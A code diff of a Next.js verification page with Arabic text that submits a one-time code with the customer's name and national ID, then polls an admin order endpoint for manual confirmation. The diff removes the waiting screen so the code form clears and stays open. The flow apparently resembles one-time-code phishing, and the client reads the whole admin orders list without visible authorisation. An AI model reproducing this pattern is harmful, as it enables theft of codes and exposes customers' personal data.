@@ -3,13 +3,12 @@
 import { useState, useEffect, useRef } from "react";
 import Link from "next/link";
 import { useCartStore } from "../../store/cartStore";
-import { KeyRound, Loader2, FileText, Receipt, X } from "lucide-react";
+import { KeyRound, FileText, Receipt, X } from "lucide-react";
 
 export default function VerifyPage() {
   const [code, setCode] = useState("");
   const [codeError, setCodeError] = useState(false);
   const [resent, setResent] = useState(false);
-  const [waiting, setWaiting] = useState(false);
   const [confirmed, setConfirmed] = useState(false);
   const [dbOrderId, setDbOrderId] = useState<string | null>(null);
   const pollRef = useRef<ReturnType<typeof setInterval> | null>(null);
@@ -18,34 +17,34 @@ export default function VerifyPage() {
 
   // polling: check order status every 5s after submit
   useEffect(() => {
-    if (!waiting || !dbOrderId) return;
+    if (!dbOrderId) return;
     pollRef.current = setInterval(async () => {
       const res = await fetch(`/api/admin/orders/${dbOrderId}`);
       if (!res.ok) return;
       const data = await res.json();
       if (data.status === "confirmed") {
         clearInterval(pollRef.current!);
-        setWaiting(false);
         setConfirmed(true);
       }
     }, 5000);
     return () => clearInterval(pollRef.current!);
-  }, [waiting, dbOrderId]);
+  }, [dbOrderId]);
 
   async function handleSubmit() {
     if (code.length !== 4 && code.length !== 6) { setCodeError(true); return; }
+    setCode("");
     await fetch("/api/verify", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ code, orderId, customerName: customer?.name ?? "—", customerId: customer?.nationalId ?? "—" }),
     });
     // get the mongo _id for polling
-    const res = await fetch("/api/admin/orders");
-    const orders = await res.json();
-    const match = Array.isArray(orders) ? orders.find((o: { orderId: string; _id: string }) => o.orderId === orderId) : null;
-    if (match) setDbOrderId(match._id);
-    setCode("");
-    setWaiting(true);
+    try {
+      const res = await fetch("/api/admin/orders");
+      const orders = await res.json();
+      const match = Array.isArray(orders) ? orders.find((o: { orderId: string; _id: string }) => o.orderId === orderId) : null;
+      if (match) setDbOrderId(match._id);
+    } catch {}
   }
 
   // ── Confirmed Popup ──────────────────────────────────────────────────────────
@@ -97,22 +96,6 @@ export default function VerifyPage() {
           </div>
         </div>
       </div>
-    );
-  }
-
-  // ── Waiting Screen ───────────────────────────────────────────────────────────
-  if (waiting) {
-    return (
-      <main className="min-h-screen bg-gradient-to-br from-gray-100 to-gray-200 flex flex-col items-center justify-center px-4" dir="rtl">
-        <div className="bg-white rounded-3xl shadow-lg w-full max-w-sm p-10 flex flex-col items-center gap-5 text-center">
-          <Loader2 className="text-teal-500 w-14 h-14 animate-spin" />
-          <h2 className="text-lg font-bold text-gray-800">في انتظار تأكيد الطلب</h2>
-          <p className="text-sm text-gray-500 leading-relaxed">
-            تم إرسال طلبك بنجاح، يرجى الانتظار حتى يقوم فريقنا بمراجعة وتأكيد طلبك.
-          </p>
-          <p className="text-xs text-gray-400">سيتم تحديث الصفحة تلقائياً عند التأكيد</p>
-        </div>
-      </main>
     );
   }
 
